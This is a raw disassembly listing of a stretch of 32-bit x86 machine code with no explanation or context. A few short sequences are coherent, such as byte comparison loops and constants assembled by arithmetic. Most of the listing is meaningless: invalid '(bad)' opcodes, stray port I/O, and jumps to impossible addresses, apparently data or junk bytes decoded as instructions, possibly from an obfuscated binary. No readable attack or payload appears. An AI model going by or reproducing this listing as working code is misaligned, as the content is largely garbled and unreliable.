  408bc3:	fcom   DWORD PTR [edx+eax*8]
  408bc6:	sub    dl,ah
  408bc8:	clc    
  408bc9:	fcomp  DWORD PTR [ebx-0x61ec9643]
  408bcf:	and    al,0x6a
  408bd1:	dec    edx
  408bd2:	sub    eax,0xa7e7e2e
  408bd7:	jg     0x408c57
  408bd9:	jle    0x408bd5
  408bdb:	arpl   WORD PTR [edx-0x36],dx
  408bde:	xchg   edx,eax
  408bdf:	fs out dx,eax
  408be1:	imul   esi,eax,0x49
  408be4:	mov    gs,WORD PTR [esi+0x57d2286d]
  408bea:	add    eax,0xc8212b37
  408bef:	adc    DWORD PTR [edi+0x1f9ff16a],ecx
  408bf5:	mov    ah,0xb0
  408bf7:	mov    dh,0xdb
  408bf9:	lods   al,BYTE PTR ds:[esi]
  408bfa:	gs das 
  408bfc:	(bad)  
  408bfd:	mov    DWORD PTR [esi-0x70229f31],edx
  408c03:	mov    ch,BYTE PTR [edx-0x2506f741]
  408c09:	push   ebp
  408c0a:	ret    
  408c0b:	jmp    0x5e96:0x9226c102
  408c12:	jge    0x408bf2
  408c14:	aaa    
  408c15:	sub    al,dh
  408c17:	jg     0x408c58
  408c19:	cmc    
  408c1a:	jecxz  0x408bd2
  408c1c:	jnp    0x408c0b
  408c1e:	adc    cl,bh
  408c20:	test   eax,0x9d6b04f1
  408c25:	lock pop ebp
  408c27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c28:	test   eax,0x5ebe0290
  408c2d:	mov    ebx,0x30571337
  408c32:	inc    ebp
  408c33:	arpl   ax,ax
  408c35:	add    dh,dl
  408c37:	mov    eax,ss:0x7865d185
  408c3d:	or     eax,0xc9de903
  408c42:	icebp  
  408c43:	scas   al,BYTE PTR es:[edi]
  408c44:	sbb    al,0x1f
  408c46:	adc    edi,esi
  408c48:	xor    DWORD PTR [eax],0xffffffdd
  408c4b:	adc    dl,dh
  408c4d:	pop    edi
  408c4e:	xchg   edx,eax
  408c4f:	or     eax,0xb255c122
  408c54:	jle    0x408c2e
  408c56:	or     ah,BYTE PTR [ebx+0x6d]
  408c59:	xchg   ebx,eax
  408c5a:	mov    eax,0x1d0f9970
  408c5f:	or     ch,bh
  408c61:	out    dx,al
  408c62:	fidiv  WORD PTR [ecx-0x3e]
  408c65:	mov    esi,0x7ebab796
  408c6a:	ret    0x1300
  408c6d:	sub    ecx,ebx
  408c6f:	dec    eax
  408c70:	push   ds
  408c71:	adc    esi,DWORD PTR [ecx]
  408c73:	and    dh,ch
  408c75:	jg     0x408cf5
  408c77:	js     0x408c17
  408c79:	add    BYTE PTR [edi+0x38665a2],dh
  408c7f:	xchg   esp,eax
  408c80:	lahf   
  408c81:	or     DWORD PTR [edx-0x1e],ebp
  408c84:	pop    edx
  408c85:	mov    ah,0xdd
  408c87:	pusha  
  408c88:	mov    ah,0x9a
  408c8a:	daa    
  408c8b:	xchg   edx,eax
  408c8c:	cmp    BYTE PTR [edx-0x59],ah
  408c8f:	out    0x17,al
  408c91:	arpl   WORD PTR ds:0x169ed2ed,bp
  408c97:	repnz mov bh,0x31
  408c9a:	jle    0x408c67
  408c9c:	jle    0x408cef
  408c9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ca0:	sub    esi,DWORD PTR [edx-0x4f16c2b9]
  408ca6:	lahf   
  408ca7:	sub    eax,0xccc38aa
  408cac:	outs   dx,DWORD PTR ds:[esi]
  408cad:	cmp    eax,0x71dde116
  408cb2:	mov    WORD PTR [ebp+0x3114e77f],es
  408cb8:	lods   al,BYTE PTR ds:[esi]
  408cb9:	imul   edx,DWORD PTR ss:[ebp+0x37fda7cf],0x21bbbd4
  408cc4:	sbb    BYTE PTR [ebx+0x53],al
  408cc7:	mov    ecx,0x1ecb7f77
  408ccc:	fld    QWORD PTR [edi+0x755dae4d]
  408cd2:	aam    0xe3
  408cd4:	sub    ch,ch
  408cd6:	xor    DWORD PTR [esi+0xed6f7c0],ebx
  408cdc:	repz pop esp
  408cde:	xor    cl,dl
  408ce0:	mov    bh,0x53
  408ce2:	dec    edi
  408ce3:	mov    al,0x77
  408ce5:	sub    DWORD PTR [edi],ecx
  408ce7:	mov    bh,0x4
  408ce9:	nop
  408cea:	xor    eax,0x8a43
  408cef:	add    eax,edi
  408cf1:	mov    edi,DWORD PTR [ebp-0x14]
  408cf4:	mov    BYTE PTR [ebp+edi*1-0x58],al
  408cf8:	mov    eax,DWORD PTR [ebp-0xc]
  408cfb:	inc    edx
  408cfc:	cmp    edx,eax
  408cfe:	jne    0x408b9f
  408d04:	pop    edi
  408d05:	pop    ebx
  408d06:	mov    eax,DWORD PTR [ebp-0x8]
  408d09:	mov    edx,DWORD PTR [ebp+0x10]
  408d0c:	xor    eax,ecx
  408d0e:	jmp    0x408e37
  408d13:	inc    esp
  408d14:	(bad)  
  408d15:	jno    0x408cee
  408d17:	icebp  
  408d18:	stc    
  408d19:	js     0x408d80
  408d1b:	xchg   esp,eax
  408d1c:	ins    BYTE PTR es:[edi],dx
  408d1d:	retf   0xbea3
  408d20:	sbb    eax,0x2f396dcf
  408d25:	jle    0x408da5
  408d27:	or     bh,BYTE PTR [edi+0x7e]
  408d2a:	jle    0x408d16
  408d2c:	dec    esi
  408d2d:	sti    
  408d2e:	mov    bl,0x87
  408d30:	js     0x408d8d
  408d32:	xlat   BYTE PTR ds:[ebx]
  408d33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d34:	neg    BYTE PTR [eax-0x7a30521]
  408d3a:	pop    es
  408d3b:	cmp    eax,0xd4d872c3
  408d40:	xchg   esi,eax
  408d41:	jo     0x408d16
  408d43:	jb     0x408cef
  408d45:	cmc    
  408d46:	arpl   WORD PTR ds:0xad3466c9,sp
  408d4c:	sub    BYTE PTR [eax-0x7828b6a6],ah
  408d52:	mov    al,0x6c
  408d54:	fmul   QWORD PTR [ecx-0x12ff779d]
  408d5a:	pop    ss
  408d5b:	push   ss
  408d5c:	mov    ah,0x6c
  408d5e:	sub    ebp,DWORD PTR [ebp+0x26]
  408d61:	fcomp  DWORD PTR ss:[esi-0x18260435]
  408d68:	(bad)  
  408d69:	dec    edi
  408d6a:	rcr    BYTE PTR [eax],0x55
  408d6d:	mov    bh,BYTE PTR [esi-0x12]
  408d70:	jecxz  0x408d9a
  408d72:	into   
  408d73:	cmc    
  408d74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d75:	arpl   WORD PTR [esp+esi*2],dx
  408d78:	ja     0x408d6c
  408d7a:	mov    ebx,ebx
  408d7c:	adc    al,0x46
  408d7e:	test   al,0x54
  408d80:	clc    
  408d81:	rcl    DWORD PTR [edi-0x79e90697],1
  408d87:	shl    BYTE PTR [edx+0x58],cl
  408d8a:	clc    
  408d8b:	sbb    bh,dl
  408d8d:	mov    esi,fs
  408d8f:	mov    edi,0x73ac7032
  408d94:	sahf   
  408d95:	(bad)  
  408d96:	mov    cl,0x25
  408d98:	arpl   di,cx
  408d9a:	out    dx,al
  408d9b:	pop    ebx
  408d9c:	sbb    edx,DWORD PTR [ebp+0x265ade68]
  408da2:	test   DWORD PTR cs:0x9f44db0e,ecx
  408da9:	add    eax,0x6101a32e
  408dae:	or     DWORD PTR [ebx-0xd02d6ca],edi
  408db4:	imul   esi,DWORD PTR [edi+0x6e60672d],0x17
  408dbb:	push   ss
  408dbc:	into   
  408dbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408dbe:	push   ss
  408dbf:	icebp  
  408dc0:	das    
  408dc1:	xchg   dx,ax
  408dc3:	cmc    
  408dc4:	inc    edx
  408dc5:	test   eax,0x7cb2d843
  408dca:	imul   esp
  408dcc:	and    al,0x3b
  408dce:	dec    eax
  408dcf:	sbb    eax,0x5d7e7cd8
  408dd4:	xchg   edx,eax
  408dd5:	stos   DWORD PTR es:[edi],eax
  408dd6:	(bad)  
  408dd7:	and    al,dl
  408dd9:	pop    esi
  408dda:	pusha  
  408ddb:	or     dl,dh
  408ddd:	pop    ebp
  408dde:	(bad)  
  408de0:	loop   0x408e1f
  408de2:	push   ecx
  408de3:	dec    ecx
  408de4:	test   al,0xef
  408de6:	sub    DWORD PTR [ebp-0x42844b0e],ecx
  408dec:	push   ecx
  408ded:	dec    esi
  408dee:	retf   
  408def:	test   eax,0xc07fe95d
  408df4:	inc    eax
  408df5:	or     esp,DWORD PTR [eax-0x1ef08d4f]
  408dfb:	pop    esp
  408dfc:	xchg   edi,eax
  408dfd:	dec    edx
  408dfe:	clc    
  408dff:	push   esi
  408e00:	sti    
  408e01:	cld    
  408e02:	shl    DWORD PTR [ebp+0x78],1
  408e05:	jp     0x408de3
  408e07:	xor    DWORD PTR [esi],0x5e
  408e0a:	(bad)  [edi-0x29]
  408e0d:	dec    ecx
  408e0e:	hlt    
  408e0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e10:	jecxz  0x408d95
  408e12:	gs pop esi
  408e14:	pushf  
  408e15:	(bad)  
  408e16:	xchg   esi,eax
  408e17:	jp     0x408e74
  408e19:	jg     0x408dbd
  408e1b:	add    eax,edi
  408e1d:	xor    bl,BYTE PTR [eax]
  408e1f:	adc    ecx,DWORD PTR [eax-0x5c84a7b4]
  408e25:	nop
  408e26:	fisubr DWORD PTR [edx+0x18]
  408e29:	fld    DWORD PTR [ebx]
  408e2b:	jae    0x408e8a
  408e2d:	mov    WORD PTR [edx+0x4d],ss
  408e30:	test   eax,0x29e67e92
  408e35:	mov    DWORD PTR ds:[ebx],0xe90289c6
  408e3c:	and    al,0x1
  408e3e:	add    BYTE PTR [eax],al
  408e40:	dec    eax
  408e41:	sub    ecx,DWORD PTR [edx]
  408e43:	lock imul edx,DWORD PTR [ecx+0x1c4aeb48],0xb4a2de2b
  408e4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e4f:	(bad)  
  408e50:	xor    eax,0xa7e7e2c
  408e55:	jg     0x408ed5
  408e57:	jle    0x408ec1
  408e59:	pop    esp
  408e5a:	icebp  
  408e5b:	and    esp,DWORD PTR [eax+0x7cf6055b]
  408e61:	repnz in eax,0x51
  408e64:	and    dh,BYTE PTR [esi+ebx*4]
  408e67:	ret    
  408e68:	imul   esi,DWORD PTR [ebx-0xd9d7a29],0x5b71362d
  408e72:	cwde   
  408e73:	(bad)  
  408e74:	in     al,dx
  408e75:	mov    esp,0xe8c04fbd
  408e7a:	mov    eax,0x4bff6c47
  408e7f:	cli    
  408e80:	mov    ebp,0xb213af28
  408e85:	retf   
  408e86:	sub    BYTE PTR [edi],ch
  408e88:	sub    bh,BYTE PTR [edi-0x2f092f39]
  408e8e:	add    al,0x74
  408e90:	mov    eax,0xe5f7813d
  408e95:	dec    eax
  408e96:	cmc    
  408e97:	mov    ch,0xb5
  408e99:	or     DWORD PTR [eax+eiz*1-0x7b],eax
  408e9d:	repz test al,0x70
  408ea0:	mov    cl,0x8c
  408ea2:	pop    edx
  408ea3:	sbb    DWORD PTR [edx+ecx*1-0x43],edx
  408ea7:	jge    0x408e6d
  408ea9:	in     al,0xf8
  408eab:	xchg   esp,eax
  408eac:	sbb    ecx,DWORD PTR [edi-0x5cb54301]
  408eb2:	or     DWORD PTR [eax+ecx*4],0xbbc6a025
  408eb9:	sbb    BYTE PTR [ebx-0x50759d1],0xac
  408ec0:	pusha  
  408ec1:	addr16 dec esi
  408ec3:	xchg   esi,eax
  408ec4:	sbb    DWORD PTR [ebx],eax
  408ec6:	xor    BYTE PTR [ecx+0x43],dh
  408ec9:	sahf   
  408eca:	les    esp,FWORD PTR [ebp+0x29]
  408ecd:	pop    edi
  408ece:	push   ebp
  408ecf:	outs   dx,DWORD PTR ds:[esi]
  408ed0:	pop    es
  408ed1:	xor    DWORD PTR [edx+0x63babd6b],esi
  408ed7:	lods   eax,DWORD PTR ds:[esi]
  408ed8:	pop    edi
  408ed9:	mov    dl,0xf2
  408edb:	pop    esp
  408edc:	les    ecx,FWORD PTR [ebx+0x1a]
  408edf:	xor    al,0x49
  408ee1:	mov    ds:0x848be851,eax
  408ee6:	push   ecx
  408ee7:	in     eax,0x48
  408ee9:	xor    esi,DWORD PTR [ecx]
  408eeb:	sub    esp,DWORD PTR [esi-0x3e9bc66a]
  408ef1:	add    al,0x28
  408ef3:	out    dx,al
  408ef4:	stos   DWORD PTR es:[edi],eax
  408ef5:	and    eax,0xd0b51cff
  408efa:	sbb    BYTE PTR [ebp-0x15d419ad],bh
  408f00:	xchg   esp,eax
  408f01:	loope  0x408ea9
  408f03:	pop    ebp
  408f04:	test   DWORD PTR [ebp+0x2],edi
  408f07:	xchg   DWORD PTR [edi+esi*1+0x22c7efe9],ebp
  408f0e:	xor    ecx,esi
  408f10:	dec    edi
  408f11:	es add eax,0x4f7ef24b
  408f17:	icebp  
  408f18:	clc    
  408f19:	jecxz  0x408ef1
  408f1b:	inc    edi
  408f1c:	add    DWORD PTR [esi+ecx*8],eax
  408f1f:	jb     0x408f72
  408f21:	aaa    
  408f22:	or     edx,DWORD PTR [ecx]
  408f24:	jl     0x408f8c
  408f26:	bound  esp,QWORD PTR [edi-0x7d08103a]
  408f2c:	mov    ebx,0x84447cfa
  408f31:	dec    eax
  408f32:	pop    esi
  408f33:	repnz shl edx,cl
  408f36:	in     eax,0x4f
  408f38:	dec    ecx
  408f39:	xor    bl,cl
  408f3b:	sar    BYTE PTR [edx],0xcb
  408f3e:	or     al,0x57
  408f40:	hlt    
  408f41:	fisttp QWORD PTR [edx-0x51]
  408f44:	clc    
  408f45:	adc    ebp,DWORD PTR [edx-0x3bbe4efc]
  408f4b:	les    esp,FWORD PTR [ecx-0x50c622d9]
  408f51:	pop    ecx
  408f52:	xchg   edi,eax
  408f53:	ror    DWORD PTR [eax-0x1f],cl
  408f56:	xchg   ecx,eax
  408f57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f58:	add    cl,al
  408f5a:	dec    edx
  408f5b:	sub    DWORD PTR [edi+edx*4-0x33],0x3a
  408f60:	stc    
  408f61:	loop   0x408f26
  408f63:	or     DWORD PTR [ebx-0x3ecc07bb],ecx
  408f69:	add    eax,esi
  408f6b:	mov    DWORD PTR [ebp+0x8],eax
  408f6e:	mov    eax,DWORD PTR [ebp+0x8]
  408f71:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  408f75:	mov    dl,BYTE PTR [ebp-0x1]
  408f78:	cmp    al,dl
  408f7a:	je     0x4090e6
  408f80:	mov    eax,DWORD PTR [ebp+0x8]
  408f83:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  408f87:	mov    edx,DWORD PTR [ebp+0xc]
  408f8a:	cmp    al,BYTE PTR [edx]
  408f8c:	jne    0x40935e
  408f92:	mov    eax,DWORD PTR [ebp-0x8]
  408f95:	mov    edx,DWORD PTR [ebp+0xc]
  408f98:	jmp    0x4090c1
  408f9d:	jmp    0x7952d498
  408fa2:	loopne 0x40901d
  408fa4:	mov    ch,0xbe
  408fa6:	jmp    0xdad9b935
  408fab:	in     al,0x39
  408fad:	shr    DWORD PTR ds:0x7f0a7e7e,0x7e
  408fb4:	jle    0x408ff6
  408fb6:	cmp    BYTE PTR [edi],ch
  408fb8:	push   DWORD PTR [ebp+0x65]
  408fbb:	mov    BYTE PTR [ecx],ah
  408fbd:	test   al,0x56
  408fbf:	add    BYTE PTR [edi],al
  408fc1:	fmul   DWORD PTR [edi]
  408fc3:	call   FWORD PTR [eax]
  408fc5:	gs into 
  408fc7:	jns    0x408fa2
  408fc9:	addr16 jns 0x408f69
  408fcc:	dec    ecx
  408fcd:	or     al,bl
  408fcf:	popf   
  408fd0:	fwait
  408fd1:	jmp    0x977396c
  408fd6:	jp     0x409013
  408fd8:	(bad)  
  408fd9:	xlat   BYTE PTR ds:[ebx]
  408fda:	mov    cl,0x95
  408fdc:	adc    BYTE PTR [edi],ah
  408fde:	pushf  
  408fdf:	shr    BYTE PTR [ebp+0x73],0x26
  408fe3:	lahf   
  408fe4:	es test ecx,0xf64139e
  408feb:	pop    esp
  408fec:	or     al,0xa3
  408fee:	and    ebp,DWORD PTR [eax-0x28]
  408ff1:	sub    al,0x8f
  408ff3:	hlt    
  408ff4:	dec    ecx
  408ff5:	push   edi
  408ff6:	sub    BYTE PTR [ecx],dh
  408ff8:	adc    cl,al
  408ffa:	shr    BYTE PTR [edi+eax*4+0x79],1
  408ffe:	sub    al,0x46
  409000:	push   ebx
  409001:	sbb    DWORD PTR [edi+0x10],ebp
  409004:	popa   
  409005:	stos   BYTE PTR es:[edi],al
  409006:	and    al,0xc9
  409008:	icebp  
  409009:	pop    edi
  40900a:	lods   eax,DWORD PTR ds:[esi]
  40900b:	mov    di,0x982
  40900f:	jnp    0x408fd0
  409011:	pusha  
  409012:	loopne 0x409047
  409014:	or     esi,ecx
  409016:	out    dx,al
  409017:	stc    
  409018:	pop    esp
  409019:	cmp    al,0x4c
  40901b:	push   ds
  40901c:	mov    ebx,0xb2b83071
  409021:	shr    DWORD PTR [ebx+0x701fe9dd],1
  409027:	jmp    0xb0c651ce
  40902c:	jb     0x409008
  40902e:	pop    es
  40902f:	test   eax,0xf22c6df0
  409034:	add    DWORD PTR [ecx+0x3],ecx
  409037:	sbb    esp,edx
  409039:	cwde   
  40903a:	lods   al,BYTE PTR ds:[esi]
  40903b:	push   eax
  40903c:	das    
  40903d:	ins    DWORD PTR es:[edi],dx
  40903e:	push   cs
  40903f:	imul   eax,DWORD PTR [ebp+ebx*4+0x5b0069a0],0xffffffb5
  409047:	js     0x40903b
  409049:	aaa    
  40904a:	cmp    eax,0xf2e6020b
  40904f:	(bad)  
  409050:	aaa    
  409051:	fiadd  DWORD PTR [esi]
  409053:	cmc    
  409054:	(bad)  
  409055:	push   ss
  409056:	mov    ecx,0xd3a0e80e
  40905b:	xor    BYTE PTR [edi-0x7b],cl
  40905e:	add    DWORD PTR [edx],esp
  409060:	push   es
  409061:	rcr    DWORD PTR [esp+edx*4-0x74],cl
  409065:	jnp    0x40905d
  409067:	sub    al,BYTE PTR [edx-0x354647ec]
  40906d:	mov    edx,0x6b292183
  409072:	jp     0x40901d
  409074:	or     ah,BYTE PTR [ebp+esi*1+0xd]
  409078:	pop    esi
  409079:	fbstp  TBYTE PTR [edx+ebp*4-0x2b]
  40907d:	int    0x63
  40907f:	inc    esp
  409080:	sbb    ecx,DWORD PTR [ecx+edx*1]
  409083:	pop    edi
  409084:	lock ins DWORD PTR es:[edi],dx
  409086:	sub    al,dh
  409088:	adc    esi,ebp
  40908a:	inc    ebp
  40908b:	repnz iret 
  40908d:	and    eax,0x8021a4b7
  409092:	rcr    DWORD PTR [ecx+0x7f6f642b],cl
  409098:	push   esi
  409099:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40909a:	fucom  st(1)
  40909c:	clc    
  40909d:	push   ss
  40909e:	je     0x409059
  4090a0:	ret    
  4090a1:	inc    eax
  4090a2:	xchg   BYTE PTR [ebx],dl
  4090a4:	cmp    bl,al
  4090a6:	pop    ecx
  4090a7:	cld    
  4090a8:	or     ebx,DWORD PTR [ebp+0x55def9d7]
  4090ae:	cmp    DWORD PTR [esi],0xffffffb3
  4090b1:	in     al,0x76
  4090b3:	fst    QWORD PTR [ebp-0x1adba49a]
  4090b9:	sbb    al,ah
  4090bb:	lea    ebx,[ebp+0x2a2d11fd]
  4090c1:	movsx  edx,BYTE PTR [edx]
  4090c4:	xor    eax,ecx
  4090c6:	add    eax,esi
  4090c8:	cmp    edx,eax
  4090ca:	je     0x409229
  4090d0:	mov    DWORD PTR [ebp-0x18],0x705fd8e
  4090d7:	lea    eax,[ebp-0x18]
  4090da:	mov    DWORD PTR [ebp-0x14],eax
  4090dd:	mov    eax,DWORD PTR [ebp-0x14]
  4090e0:	add    DWORD PTR [eax],0x705fa8e
  4090e6:	mov    eax,DWORD PTR [ebp-0x10]
  4090e9:	jmp    0x409212
  4090ee:	lods   eax,DWORD PTR ds:[esi]
  4090ef:	lock test BYTE PTR [ecx+edi*4],al
  4090f3:	sbb    BYTE PTR [ebp-0x47188557],ch
  4090f9:	daa    
  4090fa:	adc    DWORD PTR [edx-0x7],ecx
  4090fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090fe:	frstor [edx]
  409100:	jle    0x409180
  409102:	or     bh,BYTE PTR [edi+0x7e]
  409105:	jle    0x409106
  409107:	inc    edx
  409108:	mov    DWORD PTR [ebp-0x7f4a6a3b],edi
  40910e:	lea    ebp,[ebx-0x539fdcfc]
  409114:	jge    0x4090a1
  409116:	xchg   esi,eax
  409117:	cmp    eax,0xb477185
  40911c:	inc    esi
  40911d:	test   BYTE PTR [eax+0x15866c1e],dl
  409123:	imul   esp,DWORD PTR [ebx+ecx*2],0x9e05a1fe
  40912a:	sbb    al,0x2c
  40912c:	xchg   edx,eax
  40912d:	(bad)
  409132:	mov    eax,ds:0x7b524377
  409137:	mov    esi,0x13f68c1b
  40913c:	int    0x6d
  40913e:	cmp    BYTE PTR [eax+0x396039c4],ch
  409144:	repz sbb dl,BYTE PTR [ecx+edi*4-0x643b44b5]
  40914c:	ret    0x97fa
  40914f:	cmp    ebp,DWORD PTR [eax]
  409151:	(bad)  
  409152:	mov    edx,DWORD PTR [bx+si-0x6699]
  409157:	in     eax,dx
  409158:	icebp  
  409159:	lds    edi,FWORD PTR [eax+0x21ce4b81]
  40915f:	dec    edx
  409160:	push   edx
  409161:	xchg   DWORD PTR [ecx-0x58],ebx
  409164:	sub    BYTE PTR [ebp+0x67ad5a77],cl
  40916a:	sub    BYTE PTR [edi-0x80],dh
  40916d:	inc    esi
  40916e:	mov    edx,0x6ba96722
  409173:	and    al,0x9b
  409175:	or     ch,BYTE PTR [ecx]
  409177:	push   ss
  409178:	sbb    ebx,DWORD PTR [ecx+0x6a]
  40917b:	xlat   BYTE PTR ds:[ebx]
  40917c:	rcr    BYTE PTR [eax],1
  40917e:	call   0x7f7fcedb
  409183:	std    
  409184:	xchg   edx,eax
  409185:	in     eax,dx
  409186:	inc    eax
  409187:	xor    BYTE PTR [esi-0xb],cl
  40918a:	cmp    BYTE PTR [ebp-0x38],dl
  40918d:	int    0xb4
  40918f:	pop    ss
  409190:	mov    DWORD PTR [eax+0x7],eax
  409193:	mov    DWORD PTR ds:0xddedbe04,eax
  409199:	push   0xffffffe5
  40919b:	shl    DWORD PTR [edx+eax*1],1
  40919e:	push   es
  40919f:	inc    ebp
  4091a0:	cwde   
  4091a1:	or     ah,bh
  4091a3:	(bad)  
  4091a4:	jp     0x4091fc
  4091a6:	jp     0x409147
  4091a8:	pop    esi
  4091a9:	(bad)  
  4091aa:	cmp    ebx,DWORD PTR [ecx]
  4091ac:	call   0x73e696a5
  4091b1:	jp     0x40921d
  4091b3:	ins    DWORD PTR es:[edi],dx
  4091b4:	xchg   esp,ecx
  4091b6:	push   ecx
  4091b7:	iret   
  4091b8:	push   ebx
  4091b9:	lods   eax,DWORD PTR ds:[esi]
  4091ba:	push   ebp
  4091bb:	lahf   
  4091bc:	mov    bh,dl
  4091be:	in     eax,0xf
  4091c0:	lea    edx,[esi]
  4091c2:	pop    ecx
  4091c3:	xor    eax,DWORD PTR [eax-0x8]
  4091c6:	leave  
  4091c7:	or     al,0xac
  4091c9:	mov    BYTE PTR [esi-0x5d],dl
  4091cc:	xchg   esp,eax
  4091cd:	call   0x9f5b2c57
  4091d2:	popf   
  4091d3:	mov    bh,0xe6
  4091d5:	add    al,0x57
  4091d7:	or     BYTE PTR [ebp-0x2547ade0],ch
  4091dd:	push   esp
  4091de:	and    DWORD PTR [edx+esi*8-0x2fc5169d],edx
  4091e5:	jmp    0x876ca1c
  4091ea:	inc    ecx
  4091eb:	add    DWORD PTR [eax+0x16],edi
  4091ee:	mov    edi,0x127b60f8
  4091f3:	loopne 0x4091d4
  4091f5:	lahf   
  4091f6:	sub    al,0x43
  4091f8:	aas    
  4091f9:	mov    ebx,DWORD PTR [esi]
  4091fb:	push   eax
  4091fc:	int    0xf3
  4091fe:	cmp    DWORD PTR [esi-0x5b],0xffffff8a
  409202:	es retf 0x5aad
  409206:	cld    
  409207:	cmp    DWORD PTR [edx+eiz*2+0x74],esp
  40920b:	nop
  40920c:	dec    edx
  40920d:	mov    bh,0x8c
  40920f:	push   0x48
  409211:	scas   al,BYTE PTR es:[edi]
  409212:	mov    edx,DWORD PTR [ebp+0x8]
  409215:	xor    eax,ecx
  409217:	lea    eax,[eax+edx*1+0x32729f]
  40921e:	mov    DWORD PTR [ebp+0x8],eax
  409221:	inc    DWORD PTR [ebp+0xc]
  409224:	jmp    0x408f6e
  409229:	mov    eax,DWORD PTR [ebp-0x10]
  40922c:	xor    eax,ecx
  40922e:	jmp    0x409357
  409233:	or     DWORD PTR ds:0xd93acb2e,ebx
  409239:	stc    
  40923a:	(bad)  [ecx-0x4c785839]
  409240:	enter  0x4cdd,0xe9
  409244:	and    edi,DWORD PTR [esi+0x7e]
  409247:	or     bh,BYTE PTR [edi+0x7e]
  40924a:	jle    0x409228
  40924c:	or     ecx,DWORD PTR [ecx-0x388a1d39]
  409252:	into   
  409253:	cmp    al,0xb9
  409255:	adc    al,0x45
  409257:	dec    ecx
  409258:	neg    BYTE PTR [ebx]
  40925a:	leave  
  40925b:	mov    edi,0x4c672291
  409260:	pop    ds
  409261:	sub    al,0x8d
  409263:	jle    0x409208
  409265:	xchg   BYTE PTR [bp+di+0x4053],al
  40926a:	sbb    eax,esp
  40926c:	fmul   DWORD PTR [ebp-0x34]
  40926f:	sbb    BYTE PTR [ebx+0x393e0c0],bh
  409275:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409276:	mov    ecx,edx
  409278:	test   BYTE PTR [edx-0xe78894],ch
  40927e:	cmp    edi,DWORD PTR [ebx-0x3cc90ffc]
  409284:	mov    edx,0xc48ba355
  409289:	bound  ecx,QWORD PTR [ecx]
  40928b:	or     ebx,DWORD PTR ds:0x2230478f
  409291:	dec    esp
  409292:	out    dx,al
  409293:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409294:	sbb    BYTE PTR [eax],al
  409296:	lods   eax,DWORD PTR ds:[esi]
  409297:	js     0x409285
  409299:	jge    0x40922b
  40929b:	xor    BYTE PTR ds:0x5d91d3fa,al
  4092a1:	jno    0xadc29dc2
  4092a7:	dec    esp
  4092a8:	and    BYTE PTR [esi-0x3d],ch
  4092ab:	xchg   esi,eax
  4092ac:	mov    ch,0x46
  4092ae:	mov    dl,BYTE PTR [edi+0x1c13cd40]
  4092b4:	xor    al,0x2e
  4092b6:	enter  0x8afa,0xcf
  4092ba:	nop
  4092bb:	xchg   BYTE PTR [ecx+eiz*1-0x43],cl
  4092bf:	arpl   WORD PTR [eax-0x1debc6],di
  4092c5:	mov    edi,0x4df30bf5
  4092ca:	mov    dh,ch
  4092cc:	xchg   esp,eax
  4092cd:	clc    
  4092ce:	cmp    al,0x17
  4092d0:	pushf  
  4092d1:	inc    esp
  4092d2:	fwait
  4092d3:	test   BYTE PTR [ecx-0x1fde9762],bh
  4092d9:	ror    BYTE PTR [eax-0x9],cl
  4092dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092dd:	jmp    0xccd5:0xaa59257e
  4092e4:	pop    ss
  4092e5:	jns    0x409296
  4092e7:	in     eax,0x1e
  4092e9:	mul    BYTE PTR [edx-0x35]
  4092ec:	cld    
  4092ed:	mov    al,ds:0x524654be
  4092f2:	mov    al,ds:0xd236825b
  4092f7:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092f9:	clc    
  4092fa:	mov    esp,DWORD PTR [edi+0x682fa7f3]
  409300:	or     eax,0xe4b4b1fc
  409305:	arpl   WORD PTR [ebx-0x1],bx
  409308:	in     al,0xb9
  40930a:	mov    ch,0xf
  40930c:	push   es
  40930d:	jge    0x409297
  40930f:	jmp    0xf966849e
  409314:	sub    al,0xb6
  409316:	push   edi
  409317:	mov    bh,0x86
  409319:	shr    DWORD PTR [edx+0x20c3b748],1
  40931f:	aad    0x24
  409321:	data16 jle 0x409357
  409324:	xor    bl,BYTE PTR [esi-0x22]
  409327:	mov    ah,0xf
  409329:	jmp    0x4fff5820
  40932e:	mov    esi,0x970653b8
  409333:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409334:	and    ch,BYTE PTR [eax+0x31b8265f]
  40933a:	out    0x35,eax
  40933c:	pop    esp
  40933d:	push   ss
  40933e:	bound  esp,QWORD PTR [edi-0x1f2a8840]
  409344:	(bad)  
  409345:	xchg   esp,eax
  409346:	mov    ds:0x74ff7427,eax
  40934b:	sbb    ebp,DWORD PTR [edx-0x19]
  40934e:	jmp    0xaab8:0xecb48ca3
  409355:	test   eax,0x104d8bb5
  40935a:	add    eax,esi
  40935c:	mov    DWORD PTR [ecx],eax
  40935e:	pop    esi
  40935f:	leave  
  409360:	ret    0xc
  409363:	push   ebp
  409364:	mov    ebp,esp
  409366:	push   ecx
  409367:	not    eax
  409369:	mov    DWORD PTR [ebp-0x4],0xf89c853c
  409370:	mov    eax,DWORD PTR [ebp-0x4]
  409373:	mov    edx,DWORD PTR [ebp+0x10]
  409376:	add    DWORD PTR ds:0x4245c6,ebx
  40937c:	mov    ecx,0x7510859
  409381:	adc    DWORD PTR ds:0x41235c,0x4245c6
  40938b:	xor    eax,ecx
  40938d:	add    eax,0x32729f
  409392:	and    DWORD PTR ds:0x412368,0x417e41
  40939c:	mov    DWORD PTR [edx],eax
  40939e:	mov    eax,DWORD PTR [ebp+0xc]
  4093a1:	and    DWORD PTR ds:0x4245be,0x0
  4093ab:	jmp    0x4093bd
